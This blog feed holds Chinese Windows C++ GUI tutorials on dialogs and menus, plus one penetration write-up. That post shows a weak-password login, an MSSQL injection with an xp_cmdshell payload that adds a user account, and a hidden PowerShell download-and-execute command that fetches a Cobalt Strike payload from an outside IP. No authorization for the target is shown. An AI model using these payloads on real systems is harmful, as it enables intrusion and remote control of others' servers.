class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-comment">/*HWND hcheck1 = GetDlgItem(hwnd, IDC_CHECK1);</span><br><span class="hljs-comment">SendMessageW(hcheck1,BM_SETCHECK,BM_GETCHECK,0);*/</span><br><span class="hljs-comment">//SendDlgItemMessageW(hwnd, IDC_CHECK1, BM_SETCHECK, BM_GETCHECK,0);</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-built_in">EndDialog</span>(hwnd, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> IDC_BUTTON1:<br>&#123;<br>WCHAR buff[<span class="hljs-number">20</span>]&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (UINT BTNID = IDC_CHECK1; BTNID &lt;= IDC_CHECK3; BTNID++)<br>&#123;<br>UINT Checked = <span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, BTNID, BM_GETCHECK, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Checked == BST_CHECKED) &#123;<br><span class="hljs-built_in">GetDlgItemTextW</span>(hwnd, BTNID, buff, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> IDC_BUTTON2:<br>&#123;<br>WCHAR buff[<span class="hljs-number">20</span>]&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (UINT BTNID = IDC_RADIO1; BTNID &lt;= IDC_RADIO3; BTNID++)<br>&#123;<br>UINT Checked = <span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, BTNID, BM_GETCHECK, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Checked == BST_CHECKED) &#123;<br><span class="hljs-built_in">GetDlgItemTextW</span>(hwnd, BTNID, buff, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1), <span class="hljs-literal">NULL</span>, Dlgproc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次简单的web到上线</title>
    <link href="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/"/>
    <url>/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><blockquote><p>首先来到目标的后台</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/0.png" alt="0"></p><blockquote><p>看见这种很简陋 就感觉有洞<br>试了一下弱口令 靠 直接进了</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/0.1.png" alt="0.1"></p><blockquote><p>然后通过改包  也是可以登录的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/1.png" alt="1"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/2.png" alt="2"></p><p>改包进来然后修改账户 发现这账号有点离谱</p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/3.png" alt="3"></p><blockquote><p>然后就开始在后台找找能不能拿shell 的地方<br>导入的地方可以上传文件</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/4.png" alt="4"></p><blockquote><p>但是只能上传excel文件</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/5.png" alt="5"></p><blockquote><p>尝试改文件后缀 结果失败了 然后继续找其他突破口</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/6.png" alt="6"></p><blockquote><p>这里有个查询的地方 然后开启抓包 因为这种查询的地方很有可能是带有参数查询的 就可能含有注入</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/7.png" alt="7"></p><blockquote><p>好家伙 这注入不久来了嘛 mssql的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/8.png" alt="8"></p><blockquote><p>直接dba的权限<br>尝试cmdshell</p><blockquote><p><em>通过下面sql语句开启</em><br><em>xpcmd sp_configure ‘show advanced options’,</em><br><em>sp_configure ‘xp_cmdshell’,1</em></p></blockquote></blockquote><blockquote><p>尝试ping dnslog</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/9.png" alt="9"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/10.png" alt="10"></p><blockquote><p>是出网的 直接尝试添加 账户 上3389</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/11.png" alt="11"></p><blockquote><p><em>selstate=0&amp;numState1_5=&amp;Remarks2=&amp;number=1’; exec master ..xp_cmdshell ‘net user test1 test1 /add’ — &amp;numState=%E5%85%A8%E9%83%A8&amp;page=1&amp;rows=500</em></p><p>扫端口发现3389是开的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/12.png" alt="12"></p><blockquote><p>然后直接连 发现连不上 添加到用户组</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/13.png" alt="13"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/14.png" alt="14"></p><blockquote><p>还是连不上 就先不管 直接上cs</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/15.png" alt="15"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/16.png" alt="16"></p><blockquote><p><em>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘</em><a href="http://45.32.92.74:88/aa*%E2%80%98))%E2%80%9D">http://45.32.92.74:88/aa*‘))”</a>*</p><p>因为存在引号这些 所以 直接编个码</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/17.png" alt="17"></p><blockquote><p>直接复制到注入的地方</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/18.png" alt="18"></p><blockquote><p>然后GO 坐等上线</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/19.png" alt="19"></p><blockquote><p>好家伙 直接来了  杀软都没有</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/20.png" alt="20"></p><blockquote><p>然后查看ip发现是内网 那刚开始3389连不上 应该就是这个情况 对方在内网 所以没连上</p></blockquote><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote><p>因为这cs服务器没用了 所以就没打码了 师傅们轻点喷 如果我有说错的地方,师傅们 轻点喷</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows对话框资源</title>
    <link href="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/"/>
    <url>/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/1.png" alt="1"></p><blockquote><p>对话框的创建</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/2.png" alt="2"></p><blockquote><p>模态对话框和非模态对话框的区别就是  非模态对话框  如果被打开了   你还可以继续操作这个对话框后面的其他对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/3.png" alt="3"></p><blockquote><p>就比如这个属性对话框就是一个非模态对话框  打开它的同时  一样可以操作后面的main.app这些</p></blockquote><blockquote><p>创建非模态对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/4.png" alt="4"></p><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/5.png" alt="5"></p><blockquote><p>往对话框添加东西 也是很简单的  直接拖</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/6.png" alt="6"></p><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/7.png" alt="7"></p><blockquote><p>直接点工具箱  想添加什么 拖过去就行了</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/8.png" alt="8"></p><blockquote><p>然后保存  然后在来运行刚才的程序</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/9.png" alt="9"></p><blockquote><p>添加的东西也都在上面</p></blockquote><blockquote><p>创建模态对话框</p></blockquote><p><img src="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/10.png" alt="10"></p><blockquote><p>要用EndDialog 函数来终止</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span class="hljs-params">(   <span class="hljs-comment">//回调函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT Umsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wparam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lparam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (Umsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-built_in">MessageBoxW</span>(hWnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;标题&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-comment">/*DestroyWindow(hWnd);</span><br><span class="hljs-comment">PostQuitMessage(0);*/</span><br><span class="hljs-built_in">EndDialog</span>(hWnd, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">default</span>:<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1), <span class="hljs-literal">NULL</span>, Dlgproc); <span class="hljs-comment">//创建模态对话框</span><br><span class="hljs-comment">//HWND hwnd=CreateDialogW(hInstance, MAKEINTRESOURCEW(IDD_DIALOG1),NULL,Dlgproc);//创建非模态对话框</span><br><span class="hljs-comment">//ShowWindow(hwnd, SW_SHOWNORMAL);//显示对话框</span><br><span class="hljs-comment">//MSG msg&#123; 0 &#125;;</span><br><span class="hljs-comment">//while (GetMessage(&amp;msg,0,0,0))   //发送消息</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//TranslateMessage(&amp;msg);</span><br><span class="hljs-comment">//DispatchMessageW(&amp;msg);</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos编程资源操作2</title>
    <link href="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/"/>
    <url>/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/1.png" alt="1"></p><blockquote><p>还是和前面的一样 先添加资源</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/2.png" alt="2"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/3.png" alt="3"></p><blockquote><p>这是顶级菜单   以及 子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/4.png" alt="4"></p><blockquote><p>然后保存</p></blockquote><blockquote><p>还是先用前面的部分的代码</p></blockquote><blockquote><p>然后 开始添加菜单</p></blockquote><h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><blockquote><p>直接在创建窗口的时候创建菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/5.png" alt="5"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/6.png" alt="6"></p><blockquote><p>直接运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/7.png" alt="7"></p><blockquote><p>菜单直接出来了</p></blockquote><h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式:"></a>第二种方式:</h2><blockquote><p>通过传到createwindwoW 函数中  因为这个函数接受一个菜单句柄参数</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/8.png" alt="8"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/9.png" alt="9"></p><blockquote><p>因为涉及到句柄  所以就和前面的资源操作一样  需要先导入菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/10.png" alt="10"></p><blockquote><p>LoadMenuW函数接受两个参数   第一个是 这个程序的句柄  第二个是菜单资源的名称</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/11.png" alt="11"></p><blockquote><p>然后运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/12.png" alt="12"></p><h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种:"></a>第三种:</h2><blockquote><p>通过点击  添加菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/13.png" alt="13"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/14.png" alt="14"></p><blockquote><p>右键展示子菜单</p></blockquote><blockquote><p>重新添加一个右键点击消息</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/15.png" alt="15"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/16.png" alt="16"></p><p><strong>ClientToScreen 函数  将 获取的鼠标坐标转化为 相对于屏幕的鼠标坐标   因为没有转换之前 是相对于工作区 也就是 直接创建的窗口的坐标位置</strong></p><blockquote><p>但是弹出菜单的函数接受坐标  出现的位置是相对于电脑屏幕而言的坐标 所以需要转换</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/17.png" alt="17"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/18.png" alt="18"></p><p><strong>GetCursorPos 函数直接获取屏幕中的鼠标坐标</strong></p><h2 id="给子菜单添加消息"><a href="#给子菜单添加消息" class="headerlink" title="给子菜单添加消息"></a>给子菜单添加消息</h2><blockquote><p>先找到子菜单的ID</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/19.png" alt="19"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/20.png" alt="20"></p><blockquote><p>点击子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, 